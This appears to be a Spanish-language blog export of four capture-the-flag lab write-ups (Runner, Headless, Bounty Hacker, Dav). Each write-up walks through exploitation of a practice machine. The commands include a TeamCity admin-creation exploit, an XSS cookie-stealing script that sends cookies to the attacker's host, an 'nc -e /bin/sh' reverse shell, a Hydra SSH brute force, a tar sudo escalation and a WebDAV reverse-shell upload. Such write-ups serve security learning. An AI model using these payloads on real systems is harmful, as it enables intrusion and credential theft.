[{"content":"Nmap realizamos un escaneo con nmap y encontramos estos puertos abiertos\nfuzzing accedemos a la web, Nada en los puertos 80, 8000\nencontramos el subdominio TeamCity.runner.htb lo agregaremos al /etc/hosts\nesa es una página de inicio de sesión. Entonces, intenté buscar las credenciales predeterminadas, pero no tuvimos éxito\nexploit obtuve un exploit para la versión 2023.11.4 de TeamCity. TeamCity Admin Account Creation CVE-2024-27198\nexploit\nusamos el exploit de la siguiente manera\n1 python exploit.py -u http://teamcity.runner.htb --add-user consguimos estas credenciales\nvamos al panel de login anteriormente descubierto y iniciamos sesion con las crendenciales que conseguimos\nnos moveremos a backup y descargaremos el .zip\nid_rsa En la enumeración, encontramos que hay id_rsa archivo en la carpeta de copia de seguridad.\nusuarios También encontramos usuarios y hashes en la misma carpeta.\nsolo se descifra el hash de Methew\nHasta ahora tenemos un archivo id_rsa, dos usuarios (Methew, jhon), contraseña para Methew.\nssh Con id_rsa archivo podemos iniciar sesión con éxito como JHON. Hench obtuvo el acceso inicial\nconseguimos la flag de user\nAl visitar http://127.0.0.1:9000 hay una página de inicio de sesión. En el que podemos iniciar sesión con la contraseña de usuario de Methews\nportainer Nota: Portainer es un software de gestión de contenedores para implementar, solucionar problemas y proteger aplicaciones en casos de uso de nube, centros de datos e IoT industrial.\nusaremos las credenciales previamente conseguidas\n1 user matthew password .piper123 exploit También hay 2 imágenes de Docker -[ubuntu:latest, teamcity:latest]\nexploit\nSegún esta publicación, tenemos que crear un directorio de trabajo de contenedor para esta ruta → /proc/self/fd/8\ncontenedor Ahora cree un contenedor usando teamcity:latest.\nconsola Como usuario root, obtenga acceso a la consola\nroot 1 2 3 cd /mnt cd root cat root.txt ","date":"2024-08-28T00:00:00Z","image":"http://localhost:1313/p/runner-writeup/featured1_hu3705614910923351070.png","permalink":"http://localhost:1313/p/runner-writeup/","title":"Runner Writeup"},{"content":"nmap realizamos un escaneo con Nmap y encontramos estos puertos abiertos\nweb accedemos al sitio web\nno encontramos nada, vamos hacer fuzzing a la web\nfuzzing realizamos un escaneo con gobuster, usamos el comando\n1 gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/common.txt encontramos el dominio /support\nburpsuite rellenamos el campo con cualquier informacion\nvamos interceptar las peticiones con Burpsuite\nesta es la peticion con Burpsuite\nen otra terminal los colocamos en escucha\n1 python3 -m http.server 80 script vamos a robarnos las cookies de Administrador\nutilizando este script\n1 \u0026lt;script\u0026gt;var i=new Image(); i.src=\u0026#34;http://\u0026lt;tu ip\u0026gt; :8001/?cookie=\u0026#34;+btoa(document.cookie);\u0026lt;/script\u0026gt; lo colocamos de esta manera el script que previamente creamos\nbase64 vamos al servidor que nos colocamos en escucha y conseguimos la cookie de sesion pero la cookie esta en base64 vamos a descodearla\ncookie usamos este comando\n1 echo \u0026#34;aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=\u0026#34; | base64 -d la conseguimos\nvamos a la pagina y inspeccionamos nos dirigimos a storage luego a cookies y la colocamos,\nrecuerden refrescar la pagina\nal momento de recargar nos dara acceso al dashboard\npayload creamos un payload\ninterceptamos la peticion a la web\ncolocaremos el payload\nantes de mandar la peticion por Burpsuite recordemos colocarnos en escucha\nBurpsuite mandamos la peticion con Burpsuite y conseguimos una shell\nflag de user conseguida\n---\rvamos utilizar el comando sudo -l para verificar el uso de permisos en el usuario en el cual nos encontramos\n1 sudo -l nos fijamos que podemos usar\n/usr/bin/syscheck\nabuso de archivo hacemos cat a la ruta\nVemos que el archivo initdb.sh se está lanzando, por lo que lo que podemos hacer es poner una carga útil en ese archivo\n1 2 3 echo \u0026#34;nc -e /bin/sh 10.10.14.132 1212\u0026#34; \u0026gt; initdb.sh chmod +x initdb.sh sudo /usr/bin/syscheck shell en otra terminal nos colocamos en escucha y listo conseguimos la shell\n","date":"2024-08-27T00:00:00Z","image":"http://localhost:1313/p/headless-writeup/featured1_hu13800179323326257590.png","permalink":"http://localhost:1313/p/headless-writeup/","title":"Headless Writeup"},{"content":"nmap Dentro del escaneo, encontramos el puerto 21 FTP abierto, lo que parece interesante.\nEn los otros puertos no encontramos nada. Accedamos a través de FTP.\n¡Oh, muy interesante! Descarguemos esos archivos y veamos qué encontramos\narchivos Usaremos cat en los archivos para ver lo que contienen y potencialmente, encontrar credenciales\nencontramos un posible usuario llamado lin\nhydra Usaremos Hydra para un ataque de fuerza bruta, y aquí está el comando:\n1 hydra 10.10.41.104 ssh -s 22 -l lin -P locks.txt -f -vV Credenciales Obtuvimos las credenciales. Ahora podemos conectarnos a través de SSH\nssh Muy bien, ahora que estamos conectados a través de SSH, es hora de encontrar las banderas de usuario y root.\n---\rroot user Obtuvimos la bandera de usuario. Ahora, procedamos a encontrar la bandera raíz.\nSUID Usamos este comando para revisar los permisos de SUID.\n1 find / -perm -u=s -type f 2\u0026gt;/dev/null ROOT SUID Usamos sudo -l para ver los permisos que tiene root. Después de examinarlos, intentemos abusar de los permisos SUID.\nabuso de SUID Este es el comando que usaremos para abusar de los permisos de SUID y escalar privilegios:\n1 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ","date":"2024-08-29T00:00:00Z","image":"http://localhost:1313/p/bounty-hacker-writeup/featured1_hu7039275521910158098.png","permalink":"http://localhost:1313/p/bounty-hacker-writeup/","title":"Bounty hacker Writeup"},{"content":"nmap En el escaneo realizado de nmap encontramos este puerto abierto\nDentro del Puerto 80 encontramos este sitio Web, no encontramos nada interesante\nfuzzing Vamos a realizar fuzzing en la web, apuntando a subdominios, ya que no encontramos nada dentro del sitio web.\nsubdominio Dentro del subdominio, encontramos este panel de inicio de sesión. Busquemos en Google las credenciales predeterminadas para DAV.\ncredenciales Después de investigar un poco, encontramos estas credenciales. Vamos a acceder a ellos.\nUsuario : WAMPP PSWORD : Xampp\nLogramos acceder, pero lo que tenemos aquí no sirve. Intentemos otro enfoque.\nuso Creamos una shell y en otra terminal nos colocamos en usando netcat escucha.\nDonde dice \u0026ldquo;ubicación\u0026rdquo;, tomaremos esa URL y la pegaremos nuevamente en el navegador. Aparecerá el panel de inicio de sesión y volveremos a usar las credenciales. Pero recuerde estar escuchando en el puerto asignado, que por ahora es 1234.\n1 sudo curl --user \u0026#34;wamp\u0026#34;:xamp\u0026#34; http://ip/webdav/ --upload-file revershell.php -v shell conseguimos una shell\nconseguimos la user root\nroot flag Abusamos de los permisos SUID con\n1 sudo /bin/cat /root/root.txt ","date":"2024-08-28T00:00:00Z","image":"http://localhost:1313/p/dav-thm-writeup/featured1_hu5385478620713262212.png","permalink":"http://localhost:1313/p/dav-thm-writeup/","title":"dav thm Writeup"}]